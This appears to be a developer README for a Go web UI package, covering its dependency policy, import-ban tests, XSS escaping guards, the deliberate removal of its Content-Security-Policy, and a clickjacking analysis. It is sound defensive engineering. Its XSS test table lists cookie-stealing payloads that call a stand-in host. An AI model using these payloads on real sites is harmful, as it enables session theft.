# `internal/ui` — the browser surface, and the dependency policy that came with it

Read on demand. `AGENTS.md` carries the binding claim in three lines and points here for
everything below.

## What Phase A is, and what it deliberately is not

One page, one authentication chain, one rendering path — enough to prove the wiring, the
rendering, and the gate.

⚠ **THIS PARAGRAPH SAID `cmd/cairn-ui` WAS "deployed by nothing — no manifest in this
repository points a pod at it", AND IT IS RETRACTED.** The second clause is still true and
never supported the first: the manifest lives in the operator's GitOps repository. The image
is published by `.github/workflows/publish-image.yml` and the surface is live on a public
hostname. ⚠ And the heading above is kept only as a record of where this file started — the
package is six pages, a stylesheet route and two sign-in doors past "Phase A", and the
sections below are the accumulated phases rather than a description of one.

🔴 **HOW IT IS PACKAGED IS NOT STATED HERE. ASK:**

```bash
nix eval --raw .#packages.x86_64-linux \
  --apply 's: builtins.concatStringsSep "\n" (builtins.attrNames s)'
```

A sentence here used to state it, and went false when `packages.ui-image` landed. It is
DELETED rather than corrected: a corrected sentence rots on the next packaging change and
the command does not. **PUBLISHED IS NOT DEPLOYED** stays in prose because no command
answers it.

There is **no sign-in**, **no cookie session**, **no share flow** and none of the nine
screens. Those are later phases with their own decisions. What exists is:

| route | what |
|---|---|
| `GET /` | the page, over the scopes this credential may read |
| `GET /healthz` | **not in the ledger** — answered before the chain runs, says only `ok` |

🔴 **There was a second row and it was deleted, because it told an authorised operator
the opposite of the truth.** `GET /` rendered the page *with no store read* and
`GET /entries` did the work. `Page` emits *"No scope is visible to this credential.
That is an authority answer, not an empty store."* for any empty scope slice — and the
handler behind `GET /` handed it `nil` without ever calling `Source.Visible`, so a
credential with authority over every scope was told it had none, in the one sentence
written to distinguish those two cases. One page needs one route, and the route that
renders it asks. `TestEveryContentRouteConsultsTheAuthority` walks the ledger and
requires every declared route to consult the authority before rendering; it is a
regression test, not an invariant guard — measured RED on the pre-change dispatch
table with the message *"GET / rendered a page WITHOUT consulting the authority"*.

Authentication is a bearer token against the same `internal/control` projection the pod
resolves against. That is enough to exercise the chain without building the session flow,
and it is the reason the identity pin below is meaningful rather than notional.

## 🔴 The first third-party dependency, and the guarantee it removed

🔴 **The canonical statement of what was lost and what replaced it is
`internal/depspolicy`'s package doc, and it is not repeated here.** That paragraph stood in
`go.mod`, `flake.nix`, `internal/ui/doc.go`, this file, `AGENTS.md` and the package doc
itself — six sites; the package doc is now the only one that states it, and the other five
point. Read it there, including the two things this section used to under-claim and
over-claim respectively:

- the replacement is stronger than "a test instead of a build failure" sounds — all three
  Go derivations run these tests in `doCheck`, so an import-ban failure **is** a build
  failure for anyone building through nix;
- and it is weaker in one way no phrasing removes — a build refusal cannot be satisfied by
  deleting a file, and this one can. The `ok` floor in the `go` CI job is what notices a
  package's tests disappearing, and it does not notice one function disappearing.

**Both halves measured, AT A TREE OF SEVENTEEN TEST PACKAGES** — the floor is now `-lt 19`.
**Two** packages have been added since this battery ran, independently and on different
branches: `cmd/cairn-ui` with the share flow's startup refusals, and `internal/envalias`
with the `CAIRN_*` ledger. ⚠ Each of those branches measured EIGHTEEN correctly for its own
tree; nineteen is a fact about the merge and about neither side, which is why the floor was
re-measured there rather than carried forward from either. The numbers below are a RECORD OF
THAT RUN and are not re-derived here — nobody has re-run this battery at nineteen, and
re-spelling a number is not re-measuring it. What survives the count moving is the shape,
which is the row that matters, and the dependency: the RED holds only while floor == count.

| tree | `nix build .#cairn-go` | `ok` lines in its check phase | the `go` job's floor as it then stood (`-lt 17`) |
|---|---|---|---|
| unmutated | rc 0 | 17 — the count | GREEN |
| `internal/report` given `_ "maragu.dev/gomponents"` | **rc 1**, `THE IMPORT BAN FAILED for …/cmd/cairn: … internal/report -> maragu.dev/gomponents` | — | — |
| the same import, **and `depspolicy_test.go` deleted** | **rc 0** — the HTML library is linked into the installed CLI and nix builds it | 16 — one below | **RED** |

🔴 **The third row goes RED only while the floor EQUALS the package count**, and that is
the fragile part rather than an aside. `-lt <count>` refuses the deletion; `-lt <count-1>`
buys exactly one free deletion, which is the only deletion anybody would make. The floor
has been left one behind twice — once inherited, once on the `CAIRN_*` rename branch that
added `internal/envalias` — so the arithmetic is written out beside the number in
`.github/workflows/ci.yml` and this row depends on it.

The third row is the whole weakness in one line: the policy is deletable where
`vendorHash = null` was not, and the only mechanism that observes the deletion is a
package count in one CI job.

`internal/ui` renders HTML with `maragu.dev/gomponents`. There is **one** module, so the
requirement is carried by the pod's and the CLI's derivations too, and all three now pass a
real `vendorHash`. That cost was accepted explicitly — a second module for the UI would
split `internal/` in two and put a version skew between the renderer the pod links and the
one the CLI links, which is the exact failure `internal/report` being ONE package exists to
prevent.

What follows is the evidence for each part: the comparisons, the controls, and the mutants
each was watched to fail on. Records of rounds, which is why they are here and not in a
source comment.

### (i) The module allowlist — `TestTheModuleSetIsExactlyTheAllowlist`

`depspolicy.DeclaredModules` is the whole permitted set. The test reads the set the
repository actually carries — parsing `go.mod`'s `require` directives and `go.sum`'s hash
lines with two independent readers — and compares three ways:

- `go.sum` against `go.mod`, which catches the two lock files being edited apart;
- **GROWN**: a required module the allowlist does not name;
- **SHRANK**: an allowlist entry with no module behind it.

Each direction has its **own message**. A single `reflect.DeepEqual` fails in both
directions and says only "not equal", which is the same defect one level up: the reader
cannot tell which way the set moved, and the natural fix is to edit the allowlist to
match — which is exactly what the guard exists to stop somebody doing without deciding.

The instrument is validated before its verdict is read: an empty allowlist and an empty
measured set both `t.Fatal`, because two empty sets compare equal and a parser wired to
nothing produces one of them.

**Proven red, both directions, each mutant confirmed to BUILD first:**

| mutant | build | result |
|---|---|---|
| `go get golang.org/x/text` (a real, resolvable extra module) | rc 0 | `THE MODULE SET GREW: 1 module(s) are required that the allowlist does not name: [golang.org/x/text]` — and nothing else fired |
| an allowlist entry for a module nothing requires | rc 0 | `THE MODULE SET SHRANK: the allowlist names 1 module(s) go.mod does not require: […]` — and nothing else fired |

### 🔴 There is no `go mod verify` step, and the deletion is the finding

A `go mod verify` step stood in the `go` job as "part (ii)", under a long block of
comment arguing what it did and did not catch. **It verified the empty set.** `cache: false` on
that job's `actions/setup-go` means it starts with no module cache, `go mod verify` does
not download, and it stood ahead of the `go vet` step — so it ran against a cache nothing
had yet populated and printed the identical success line over zero modules. Measured on go1.26.7 against isolated
`GOMODCACHE`s, `rc` captured before any pipe:

| state | rc | stdout | modules extracted in the cache |
|---|---|---|---|
| **cold — the state CI actually ran it in** | **0** | `all modules verified` | **0** |
| populated (positive control) | 0 | `all modules verified` | 1 |
| populated + a line appended inside the module dir (negative control) | **1** | `maragu.dev/gomponents v1.3.0: dir has been modified` | 1 |

Moving it below `go test` would not have rescued it. The only hazard it can see is a cache
modified **after** its fetch; this job fetches into a cache no earlier step restored, and
nothing between the fetch and the check writes to it. In its new position it would be
green-by-construction too — a gate nobody can fail.

It also never gated the hazard its name suggests. With `go.sum`'s `h1:` line corrupted it
exits **0** with `all modules verified` in **both** cache states. What refuses that tree is
the build, which the `go vet` and `go test` steps already run (measured with
`go build ./...` over an isolated cache; whether a `nix build` refuses it with the same
words is **not** measured):

| tamper | `go mod verify` | `go build ./...` |
|---|---|---|
| a character changed in `go.sum`'s `h1:` line | **rc 0**, `all modules verified` (cold **and** populated) | **rc 1**, `verifying maragu.dev/gomponents@v1.3.0: checksum mismatch` → `SECURITY ERROR / This download does NOT match an earlier download recorded in go.sum` |

`TestGoModVerifyPassesIsNotThisSuitesJob` went with it. Its docstring claimed it kept the
step from becoming a gate over an empty set; its body asserted that **`go.sum` names ≥1
module**, which is the wrong quantity — a non-empty `go.sum` does not make the module cache
non-empty, and the cold cache above is the proof. A guard whose description is wider than
its body reads as coverage while providing none, which is worse than none.

### (ii) 🔴 The import ban — the one that keeps the pod clean

`TestNoPackageTheCLIOrThePodLINKSReachesAThirdPartyModule` builds the import graph of
every package under `cmd/` and `internal/` with `go/build` — **parsed, not grepped**, so
an import behind an alias is seen and a module name in a comment is not — computes the
transitive closure out of `cmd/cairn` and `cmd/cairn-server`, and refuses any third-party
import edge inside either.

The allowlist alone cannot do this job: an allowlist of one entry is satisfied by a tree
in which `internal/api` imports that entry on every route.

Three controls run before its verdict is read:

1. **Positive control** — `cmd/cairn-ui`'s closure MUST contain a third-party edge. A walk
   that cannot see the one dependency this repository has cannot vouch for the absence of
   any other, so a zero there withholds the result rather than reporting it clean.
2. **Depth control** — each root's closure must contain a module-internal package that is
   not one of that root's own imports. It is *computed*, not a named package: the first
   draft named `internal/store`, which `cmd/cairn-server` imports **directly**, so the
   control would have been satisfied by exactly the depth-1 walk it existed to refuse.
3. **Platform control** — `go/build`'s default context evaluates `//go:build` lines for the
   current `GOOS`/`GOARCH`, so an import reached only on another platform would be
   invisible. `TestTheImportGraphDoesNotDependOnTheBuILDPLATFORM` re-walks with constraint
   evaluation disabled and requires the same import set. If it ever fails, the ban has a
   hole and the ban is what needs widening.

Test-only imports are excluded from the graph: a `_test.go` file is compiled into a test
binary and never into the program, so counting it would refuse a test that imports a
third-party assertion library — a refusal about nothing, which is how a gate gets deleted.

**Measured on this tree, reported as a pair and never as a bare zero:**

| root | packages in closure | third-party edges |
|---|---|---|
| `cmd/cairn` | 32 | **0** |
| `cmd/cairn-server` | 56 | **0** |
| `cmd/cairn-ui` (positive control) | 52 | **3** |

**Proven red:**

| mutant | build | result |
|---|---|---|
| `internal/report` gains `_ "maragu.dev/gomponents"` | rc 0 | `THE IMPORT BAN FAILED for …/cmd/cairn` **and** `…/cmd/cairn-server`, each naming the edge `internal/report -> maragu.dev/gomponents` |
| `UIBinaryRoot` repointed at a clean binary | rc 0 | `POSITIVE CONTROL FAILED: …/cmd/cairn reaches NO third-party import` |
| `Closure` stops descending after depth 1 | rc 0 | `DEPTH CONTROL FAILED: every module-internal package in …/cmd/cairn's closure is one of its OWN imports` |

**And the claim measured on the artefacts themselves**, which is what the ban is a proxy
for — `go tool nm` over the three binaries: `cairn` **0** gomponents symbols,
`cairn-server` **0**, `cairn-ui` **75**; and `go version -m` records
`dep maragu.dev/gomponents v1.3.0` in `cairn-ui` alone.

### (iii) The prose

`go.mod`'s header and `flake.nix`'s `vendorHash` comment both **stated** the old
guarantee. Both now quote the sentence they replaced rather than deleting it, so a
maintainer who remembers the property is told where it went instead of inferring that
nothing took its place — and both then **point** at `internal/depspolicy`'s package doc
rather than restating what replaced it. That restatement stood in six places at once;
`one rule, one place` applies to prose that is a claim, and six copies of a claim are six
chances for five of them to go stale while still reading as authoritative.

⚠ A vendor hash is **not** a dependency gate and must not be read as one. It pins the
bytes of whatever the module graph resolves to; it says nothing about which modules are in
that graph, and adding one just changes the hash.

## 🔴 The XSS guard

This is the first surface in cairn's history that renders arbitrary user text into HTML.

**Measured against gomponents v1.3.0's own source, not assumed:** `Text`/`Textf` and the
*value* half of `Attr` all run `template.HTMLEscapeString`, so text content and a quoted
attribute value are safe against breakout. Two things are **not** covered, and both are
reachable here:

- **A URL scheme.** `html/template` rewrites a `javascript:` href to `#ZgotmplZ`;
  gomponents writes it through unchanged, because `template.HTMLEscapeString` has nothing
  to say about a scheme — every character of `javascript:alert(1)` survives escaping
  intact. A store entry's `tasks:` ref is `<system>:<id>`, which is *exactly* the shape of
  a scheme plus an opaque part, so this is reachable input and not a constructed one.
- **An element or attribute NAME.** `El` and the name half of `Attr` are written verbatim,
  so a name built from user text is a breakout the value escaping structurally cannot see.

Three mechanisms answer those, and each is checked by a test rather than asked for by a
comment.

### `safeHref` allowlists schemes

`http://` and `https://`, and nothing else. A denylist is the wrong shape: the set of
schemes a browser will execute is open, so a list of the ones to refuse is wrong the
moment it is written. A ref that does not pass renders as **plain text** — visible, inert,
and not silently dropped; dropping it would hide a fact the file carries, and
`<a href="">` would put a clickable element on the page whose target the reader cannot see.

⚠ **The case-fold and the whitespace strip protect the PERMIT side, not the refuse side**,
and an earlier comment here said the opposite. Measured with mutants: deleting the
`ToLower` makes `HTTPS://tracker.invalid/…` be **refused** and changes nothing about
`JaVaScRiPt:`, which an allowlist rejects at any casing. Deleting the strip refuses
`  https://…`. Neither is what stops the script-scheme attack — the allowlist is. What
they buy is that a correctly-spelled URL is not silently demoted to plain text, and that
the value written into the href is the stripped one, so what the page shows and what the
browser resolves are the same string.

### The raw-node ban — `TestNoRawNodeConstructorAppearsInTheUIPackage`

An AST scan, not a grep: it resolves each file's **import alias** for the gomponents
module and matches selector expressions against it, so `g.Raw` is seen (a text search for
`gomponents.Raw` finds nothing that exists) and an unrelated method named `Raw` is not.

It refuses `Raw`, `Rawf`, a dot-import of the module, and `El`/`Attr` called with a
non-constant name argument. It covers `_test.go` files too — a test that renders with
`g.Raw` and asserts a comfortable output is exactly how a rendering guard gets walked.

It reports a pair: the number of gomponents calls it **inspected** must be non-zero, or a
scanner that resolved no alias reports a clean zero indistinguishable from a pass. On this
tree: 9 files scanned, 48 calls inspected, 0 findings.

⚠ **One conservative gap, stated rather than hidden:** a bare identifier is accepted as a
name argument without proving it is a `const`, because proving that needs the type checker
and this ban runs without one. So `g.Attr(someVariable, v)` is **not** caught. What is
caught is every shape that could carry user text directly — a call, an index, a selector,
a conversion — which is where such a name actually comes from.

**Proven red — six mutant shapes, each asserted to fail with its OWN message**, because a
mutant killed by a different arm proves the scanner can produce output and proves nothing
about the rule the arm exists for: `g.Raw`, `g.Rawf`, `gom.Raw` (a different alias),
`g.El(e.Ref)`, `g.Attr(e.Ref, …)`, and a dot-import. Plus the mirror: a clean source using
`g.Attr(refAttr, …)`, `g.El("span", …)` and `g.Textf` must produce **zero** findings, or
the ban refuses all rendering rather than unescaped rendering.

### The rendering test — `TestHostileEntryTextIsEscaped`

**Realistic hostile fixtures, not textbook ones.** `<script>alert(1)</script>` is what
every escaper's own test suite already covers, and it exercises exactly one context. Each
fixture below breaks out of a **different** position and does something an attacker would
actually want. All are synthetic; `collector.invalid` and `tracker.invalid` are in the
IANA-reserved `.invalid` TLD and resolve nowhere.

| position | input |
|---|---|
| text content | `Rollout notes</span><img src=x onerror="fetch('//collector.invalid/c?'+document.cookie)">` |
| attribute value | `runbook" onmouseover="fetch('//collector.invalid/c?'+document.cookie)" data-x="` |
| unclosed tag | `<div style="position:fixed;inset:0;z-index:2147483647;background:#fff" onclick="` |
| href | `javascript:fetch('//collector.invalid/c?'+document.cookie)` |
| href, case-varied + tab | `\t JaVaScRiPt:void(document.title=document.cookie)` |
| href | `data:text/html;base64,PHNjcmlwdD5mZXRjaCgnLy9jb2xsZWN0b3IuaW52YWxpZC8nKTwvc2NyaXB0Pg==` |
| a scope heading | `platform</h2><script src="//collector.invalid/x.js"></script><h2>` |

The entry's ref is rendered into **both** a `title` attribute and text content, so both of
gomponents' escaping paths are exercised rather than one.

Three assertions, in increasing strength:

1. **A structural differential.** A benign world of the *same shape* — one scope, one
   entry, one alias, three refused refs and one link — must produce a page with an
   identical markup shape: the counts of `<`, `>` and `="`. Escaping's whole claim is that
   the page's shape does not depend on its content, and this needs no list of attack
   strings, so it is blind to nothing a future payload invents. Measured: hostile
   `{lt:49 gt:49 eqQuote:17}` == benign `{lt:49 gt:49 eqQuote:17}`.
2. **A token scan**, over four substrings this renderer never emits: `<img`, `<script`,
   `href="javascript:`, `href="data:`. The positive control feeds it the raw fixtures and
   requires the count to move — reported as the pair `4 in the raw fixtures, 0 in the
   rendered page`, never as the zero alone.
   ⚠ An earlier draft of this list also held `onerror=`, `onmouseover=`, `</span>` and
   `</h2>`, and **every one of those fired on a correctly escaped page**: `</span>` and
   `</h2>` are the page's own structure, and `onerror=&#34;…` is the escaped, inert
   rendition — `=` is not an escapable character, so a substring test cannot tell live
   markup from escaped text. A guard that fires on a safe page is a guard that gets
   deleted.
3. **The whole normalised escaped string**, pinned as a literal for four of the fixtures —
   a guard on *words* is walkable by rewording. The literals are hand-written from the HTML
   escaping rules rather than produced by `template.HTMLEscapeString`, so the expectation
   is not derived from the implementation it tests.

Plus: each refused ref must appear as **text** and must not appear after `href="`; and the
one benign `https://` ref **must** render as a link, or every "no `href=javascript`"
assertion above is satisfied by a page with no links at all.

**Proven red:**

| mutant | build | result |
|---|---|---|
| the entry title renders through `g.Raw` | rc 0 | the structural differential moves to `{lt:51 gt:51 eqQuote:18}`, `<img` appears once, the escaped-literal pin misses — **and** the raw-node ban names `render.go:60: calls g.Raw` |
| `safeHref` returns `(raw, true)` for everything | rc 0 | `href="javascript:` ×2 and `href="data:` ×1 in the page, both refused-ref assertions fire, and `TestSafeHrefAllowlistsSchemes` reports nine specific permits |
| the `ToLower` is deleted | rc 0 | `safeHref refused a permitted URL "HTTPS://tracker.invalid/issue/1"` |
| the whitespace/C0 strip is deleted | rc 0 | `safeHref refused a permitted URL "  https://tracker.invalid/issue/1  "` |

### 🔴 THE SCOPE OF EVERY GUARD ABOVE IS THE RENDERER'S BYTES, NOT THE PAGE A READER GETS

⚠ **This is a scope correction, not a vulnerability report, and it is an operator decision to
accept what was measured rather than a hazard left open.** Nothing above is softened: the
escaping, `safeHref`, the raw-node ban and the structural differential all measure what this
package *emits*, they all still hold, and none of them is weakened by what follows.

What moved is a claim this section and `uiaudit` were both making one step wider than their
evidence. The XSS story partly rests on **the page carrying no script but the allowlisted
ones** — it was "no script at all" until the scope page's entry filter (see the section on the
one script below); `uiaudit`'s `refuseWalkRegressions` refuses any capture holding an inline
script, a `src` `ui.AllowedScriptSources` does not name, or an allowlisted one twice, and is the
gate behind it. **That gate boots its own pod on loopback over a temp directory it created**,
so its zeros are a property of the ORIGIN's own bytes. They are structurally incapable of
seeing anything inserted between that origin and a real client, and **on the current
deployment something is.**

**Measured at the edge of the deployed surface with an HTTP client** — no browser, so no
extension can be blamed — against a positive control proving the counter sees a `<script>`
when one is present:

| probe | `<script>` elements | what they are |
|---|---|---|
| anonymous `GET /sign-in` | **1** | an inline bot-detection injection (`__CF$cv$params`, referencing a `/cdn-cgi/challenge-platform/…` script) |
| authenticated `GET /`, real session cookie | **2** | that same inline script, **plus** `<script data-cfasync="false" src="/cdn-cgi/scripts/<id>/cloudflare-static/email-decode.min.js">` |

So the honest claim is: **this RENDERER emits no script beyond its allowlist — which is the
property the guards above establish — and the SERVED page may carry script inserted downstream,
as it does today.** Every script-allowlist verdict in this repository should be read at that
scope (these measurements predate the filter script; the scope page now carries one more,
allowlisted, of the origin's own). The
`default-src 'none'` row in the table below is the same fact from the other side: with the
header gone, nothing in a browser refuses that injected script, and the row's *"arbitrary
script … become loadable"* is now realised rather than hypothetical.

#### ⚠ AND A RETRACTION, RECORDED BECAUSE THE LESSON IS WORTH MORE THAN THE CORRECTION

The previously-recorded measurement said authenticated `GET /` carries **no** script, and
concluded from the difference against `/sign-in` that the injection *"is not even uniform"*.
**Both halves were wrong**, and the reason is the generalisable part: that earlier reading was
taken **anonymously**, so what it measured was a **12-byte `401` body** — a refusal, not the
entries page. Re-measured with a real session cookie, `GET /` carries two.

🔴 **AN ANONYMOUS PROBE OF AN AUTHENTICATED ROUTE MEASURES THE REFUSAL, NOT THE PAGE.** It
returns a well-formed, quotable number about a body no reader ever sees, and the number is
reassuring in exactly the direction that stops anyone looking. The injection is uniform; the
probe was not. Every future measurement of this surface has to say which credential it carried.

#### 🔴 THE SAME EDGE REWRITES CONTENT, NOT ONLY SCRIPT — WHICH BINDS A NEXT EDIT HERE

This is the half that is easy to lose, because it is not a script and no script counter can
see it. The rendered `signed in as <address>` arrives at the client as:

```
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="<hex>">[email&#160;protected]</a>
```

An email-obfuscation rewriter replaced the address with a literal placeholder and introduced an
`href` this application never emitted — **to an endpoint no route ledger here declares**. Two
consequences, both of which bind anyone editing this section:

- **With script disabled the surface displays a FALSE identity string.** Not an escaped one, not
  a missing one — a placeholder that reads as content.
- **A test over the renderer's output bytes says nothing about what a reader sees.** That is
  aimed squarely at assertion 3 above, the whole-normalised-string pin: it is still the right
  guard, because the renderer's bytes are the thing this package controls and the only thing it
  can be held to. But it is a claim about a string leaving this process, and a downstream
  rewriter can alter any of it. Do not widen a pin on rendered bytes into a claim about the
  rendered page — including `ReplicaHonesty`, which is pinned as a whole normalised string for
  its own reasons and is subject to the same limit.

**Nothing here is a reason to add a guard.** No test in this repository can reach the edge, and
a guard that could would be pinning somebody else's configuration; what closes this class is a
smoke probe against a real deployment, which this repository still does not have — the same
unclosed gap `uiaudit/doc.go`'s retracted item 4 names.

### Response hardening: one header, and a policy that was DELETED on purpose

`X-Content-Type-Options: nosniff`. That is the whole list. The escaping is the guard; that
header is behind it.

🔴 **THE CONTENT-SECURITY-POLICY IS GONE, BY OPERATOR DECISION — challenged once with the
blast radius below and reaffirmed.** It was
`default-src 'none'; style-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'`.
`TestTheHTMLResponseSendsNoContentSecurityPolicy` pins the absence on both HTML shapes and on
the report-only spelling, so restoring the header is a decision somebody takes in that test
rather than a line that reappears in a merge.

**What was given up, named rather than left to be reconstructed:**

| clause removed | what it had been stopping |
|---|---|
| `frame-ancestors 'none'` | the surface is FRAMABLE — full clickjacking of the share flow's state-changing POSTs, with both cross-site gates satisfied; see below |
| `form-action 'self'` | an injected form can be induced to POST offsite |
| `base-uri 'none'` | an injected `<base href>` re-points every relative URL on the page |
| `default-src 'none'` | arbitrary script and third-party origins become loadable |

### 🔴 The framing row — and a RETRACTION of this section's own previous correction

⚠ **THIS SECTION HAS BEEN WRONG ONCE IN EACH DIRECTION, AND THE SECOND TIME WAS THE UNSAFE
ONE. It is the load-bearing description of an operator decision that was reaffirmed on it, so
both drafts are quoted rather than reworded away.**

The **original** text said: *"A clickjacked submit originates INSIDE the page: its `Origin`
really is this origin and the CSRF token rendered into it really is the victim's, so gate (2)
and gate (6) both pass. Framing was never something those gates could see; refusing to be
framed was the only defence and it is now absent."*

The **second** draft called that wrong, on the grounds that `identity.SessionCookie` sets
`SameSite=Lax` so a framed load carries no cookie and renders the sign-in page, and concluded
the exposure was *"SMALLER than recorded"*. **That second draft is retracted. The original
stands.**

🔴 **`SameSite` IS SITE-SCOPED; `frame-ancestors` WAS ORIGIN-SCOPED.** They are not the same
boundary and the retracted draft conflated them. "Same site" is the **registrable domain**.
`session.go`'s own comment says so, and the retracted draft cited that very comment while
stopping one clause short of the words that refute it — quoted here **in full**:

> `Lax` is NOT treated as the CSRF guard — it is a browser-side property this server cannot
> verify, **and "same site" still includes a sibling subdomain**. The guard is the token.

So a framer at **any host sharing this deployment's registrable domain is same-site**. Lax
attaches `__Host-cairn-session` to that framed load — the `__Host-` prefix stops a sibling
*setting* the cookie and has nothing to do with how the site is computed. The framed document
renders **authenticated**, with a real `csrfTokenFor` token in it; the induced click submits
with `Origin` genuinely equal to this origin; `sameOrigin` passes and the token matches. The
originally recorded mechanism follows **in full**. `internal/identity/session.go` already
models a hostile sibling host under the registrable domain as a real attacker against this
exact cookie — it is the same attacker.

**The live cases, worst first:**

| case | what happens |
|---|---|
| **a SAME-SITE framer** — any host under this deployment's registrable domain | full clickjacking of the share flow's grant and revoke POSTs, **both gates satisfied**, exactly as the original text said. ⚠ Whether such a host exists is a property of the **deployment** — what else is served under that domain — which this repository cannot see and must not assume away |
| **a cross-site framer in a client that does not enforce Lax** | same mechanism, restored in full, and nothing here would know |
| **UI redress against the unauthenticated sign-in page** | needs no cookie at all, so it frames from **any** origin; a framed sign-in form under an attacker's chrome is a phishing surface, and no gate addresses it because every request involved is legitimate |
| **any route a later change makes reachable without a session** | inherits the row above, with nothing going red — the standing cost of having no `frame-ancestors` |

What `SameSite=Lax` actually buys is the **narrower** case only: a framer at a *different*
registrable domain. That is worth having and it is not what the retracted draft claimed.

🔴 **AND THE EVIDENCE CLASS, WHICH DID NOT IMPROVE ACROSS EITHER DRAFT.** All of this is
**derived** — from the cookie constructor, and from `SameSite`/`frame-ancestors` scoping rules.
**No test in this tree and no browser run has framed this surface or observed which requests
carry the cookie.** `session.go` flags its neighbouring `Secure`-on-`localhost` claim as
unmeasured for the same reason. The lesson the retraction leaves is the point: the wrong draft
was *also* derived, *also* read plausibly, and was unsafe — derivation is not a substitute for
measuring it.

🔴 **AND THE GATES THEMSELVES ARE UNTOUCHED, WHICH IS A DIFFERENT SENTENCE FROM THE ONE ABOVE.**
`sameOrigin` and `csrfTokenFor` are derived from the request method by `stateChanging`, they
read no header `writeHTML` sets, and `session_test.go` measures them. So are the `__Host-`
cookie attributes and the sign-in lockout. Reading "the CSP is gone" as "cross-site protection
is gone" is the mistake this paragraph exists to stop.

⚠ **ONE THING THE DELETION DID NOT BUY, BECAUSE THE OPPOSITE IS THE OBVIOUS GUESS:** the policy
was never what blocked Tailwind. `style-src 'self'` permits a compiled same-origin stylesheet —
which is precisely how the stylesheet was served *under* that policy, from `/static/app.css`.
The absent build step was the blocker; it is now present (`tailwind.css` → `app.css`, gated by
`checks.ui-stylesheet-is-current`). The header deletion removed a control and additionally
unblocked the Tailwind Play CDN, which Tailwind documents as not for production and which this
surface does **not** use.

⚠ **THE PARAGRAPH THIS SECTION REPLACED WAS WRONG ABOUT THE POLICY IT DESCRIBED, TWICE, and the
record is kept because it is the reason to distrust a prose restatement of a header.** It read
*"a CSP of `default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'`
— no script permitted at all."* The `form-action 'none'` half had been **stale since Phase B**,
when the constant moved to `'self'` so the forms would work — so this README asserted a stricter
policy than the code shipped, for two phases, in the section whose whole job is to state what
the response promises. The lesson outlives the header: a policy written in prose drifts from the
policy on the wire, which is why what remains here is a table of what was REMOVED and a test
name, not a string anybody has to keep in step.

## 🔴 `TrustedHeader` is not in this binary's identity chain

`internal/identity/README.md` states the hazard plainly: on a pod that is reachable
directly, that backend lets anyone who can open a socket **be** any user in the control
plane, at that user's full authority, on every route, with the writes attributed to them.
The pod's defence is an operator's explicit proxy-fronted declaration plus a source check
— a property of the **deployment**.

A browser surface cannot carry that trade, because its whole purpose is to be publicly
reachable. So `ui.AuthBackends` has **no `*identity.TrustedHeader` parameter at all** where
`identity.Backends` does, and `cmd/cairn-ui` never calls `identity.FromEnvironment` (which
arms the backend from the environment). The backend is unreachable here by construction
rather than refused by configuration, which is the stronger claim: a configuration refusal
can be reconfigured.

⚠ **This sentence deliberately carries NO parameter COUNT.** It read *"takes two backends
where `identity.Backends` takes three"* while `AuthBackends` took **one**, and refreshing
that number would have been *wrong on merge with no textual conflict to warn anybody*: the
branch adding cookie sessions moves `AuthBackends` to two parameters and `identity.Backends`
to four, and does not touch this line. The ABSENCE of one named parameter is the property,
and it is what `TestTheUIChainHasNoTrustedHeaderMember` grades — on the chain the function
RETURNS, not on its signature.

⚠ **The signature is the mechanism; the signature alone is not the guard.** Nothing stops
a future caller building an `identity.Chain` literal and appending one.
`TestTheUIChainHasNoTrustedHeaderMember` inspects the chain `AuthBackends` **returns** —
the state, not the spelling — with a live `*identity.TrustedHeader` available to it, and
carries its positive control in the same function: that same value is passed to
`identity.Backends`, where it **must** appear, or the type assertion is broken and its
absence from the UI chain means nothing. Measured: `1 in the identity.Backends control
chain (2 members), 0 in the UI chain (1 members)`.

**Proven red — and the first mutant SURVIVED, which is worth more than the kill:**

| mutant | result |
|---|---|
| `AuthBackends` forwards a `TrustedHeader` built with `Secret: []byte("mutant")` | **SURVIVED.** The secret is 6 bytes against `identity.MinProxySecretBytes = 32`, so `NewTrustedHeader` refused, `trusted` was a nil `*TrustedHeader`, `identity.Backends` skipped it, and the test passed against a mutant that armed **nothing**. A mutant that evaluates to a no-op proves nothing, and it looks exactly like a kill that did not happen. |
| the same, with a 33-byte secret and the construction error surfaced | **KILLED**, with its own message: `THE UI CHAIN CONTAINS 1 *identity.TrustedHeader MEMBER(S)…` |
| the membership check asserts `*SupabaseJWT` instead | **KILLED** on the control arm: `POSITIVE CONTROL FAILED: identity.Backends was handed a live *identity.TrustedHeader and the membership check found none…` |

## The route ledger

`ui.DeclaredRoutes()` derives from the same `routes` map the dispatcher reads — there is
no second copy to disagree with. It is read by **one** guard,
`TestTheRouteLedgerMatchesTheDispatchTable`, which runs in `mkGoUI`'s own check phase, so
`nix build .#cairn-ui` gates it.

🔴 **Three mechanisms pinned this list and two were removed, which is a decision and not
an oversight.** A draft carried the Go test *plus* `checks.go-ui-declares-its-routes`
(running the binary and diffing its `-routes` output against a third hand-written copy)
*plus* a `nix` CI step naming that check — three mechanisms over a **one-row** hand-written
list. The `-routes` flag went with them: its only reader was the check, and a flag with no
caller is the shape this repository refuses elsewhere as exported API with no consumer.

⚠ **The pod's equivalent is kept, and the asymmetry is the reason.** `api.DeclaredRoutes()`
is checked against `tests/conformance/requests.json` — an external corpus saying what the
world expects — and the corpus builder is **Python**, structurally blind to a compiled
binary, so `cairn-server -routes` is a genuinely second instrument in a second environment.
This surface has neither a corpus nor a Python-side gate; printing the list from the binary
restates one claim down a longer path. The strongest available claim here is that the
ledger and the dispatcher read one map and that the expected set is spelled out once by
hand: a grow-or-shrink guard on a hand-written list, not a contract comparison. When a
later phase gives this surface a corpus, the second tier comes back with it.

⚠ **The two ledgers are separate and neither moves the other.** `GET /` here is a page;
`GET /` on the pod is the byte-pinned uniform 401 in
`tests/conformance/golden/root-path.json`. This change touches neither — verified by
content hash against the base commit, not by ancestry:

```
UNCHANGED  internal/api/routes.go                     be64d465830e94d8…
UNCHANGED  tests/conformance/requests.json            7eece95fc6603e83…
UNCHANGED  tests/conformance/golden/root-path.json    8a715a7fbafda493…
```

## What this surface's tests structurally cannot see

- **A real browser.** Every escaping assertion is over rendered bytes. No test here parses
  the output the way a browser's tokenizer does, so a payload that survives HTML escaping
  and is still executed by a real parser quirk would pass. The structural differential is
  the closest thing to a parse and it is a count, not a tree.
- **The `nix` build's check phase pins dimensions.** `mkGoUI`'s `go test ./...` runs in a
  sandbox with no store, no token, no network and no `HOME` with a cache root. Every guard
